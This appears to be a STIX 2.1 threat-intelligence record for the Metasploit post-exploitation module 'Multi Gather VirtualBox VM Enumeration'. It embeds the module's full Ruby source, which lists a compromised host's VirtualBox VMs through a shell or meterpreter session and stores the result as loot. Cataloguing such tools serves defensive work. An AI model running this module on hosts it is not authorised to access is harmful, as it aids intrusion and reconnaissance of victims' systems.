{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b92754bb-a7d5-4e68-b91a-a11d999be5c0",
    "created": "2024-08-14T16:33:19.188287Z",
    "modified": "2024-08-14T16:33:19.18829Z",
    "name": "Multi Gather VirtualBox VM Enumeration",
    "description": " This module will attempt to enumerate any VirtualBox VMs on the target machine. Due to the nature of VirtualBox, this module can only enumerate VMs registered for the current user, therefore, this module needs to be invoked from a user context.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/enum_vbox.rb",
            "external_id": "enum_vbox.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'yaml'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather VirtualBox VM Enumeration',\n        'Description' => %q{\n          This module will attempt to enumerate any VirtualBox VMs on the target machine.\n          Due to the nature of VirtualBox, this module can only enumerate VMs registered\n          for the current user, therefore, this module needs to be invoked from a user context.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['shell', 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    case session.platform\n    when 'windows'\n      if session.type == 'meterpreter'\n        begin\n          res = cmd_exec('c:\\\\Program Files\\\\Oracle\\\\VirtualBox\\\\vboxmanage', 'list -l vms')\n        rescue ::Rex::Post::Meterpreter::RequestError\n          print_error('VirtualBox does not appear to be installed on this machine')\n          return nil\n        end\n\n        if res.empty?\n          print_status('VirtualBox is installed but this user has no VMs registered. Try another user.')\n          return nil\n        end\n      else\n        res = cmd_exec('\"c:\\\\Program Files\\\\Oracle\\\\VirtualBox\\\\vboxmanage\" list -l vms')\n        if res.empty?\n          print_error('VirtualBox isn\\'t installed or this user has no VMs registered')\n          return nil\n        end\n      end\n    when 'unix', 'linux', 'bsd', 'osx'\n      res = cmd_exec('vboxmanage list -l vms')\n\n      unless res.start_with?('Sun VirtualBox') || res.include?('Name:')\n        print_error('VirtualBox isn\\'t installed or this user has no VMs registered')\n        return nil\n      end\n    end\n\n    return nil unless res\n\n    vprint_status(res)\n    store_path = store_loot('virtualbox_vms', 'text/plain', session, res, 'virtualbox_vms.txt', 'Virtualbox Virtual Machines')\n    print_good(\"#{peer} - File successfully retrieved and saved on #{store_path}\")\n  end\n\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}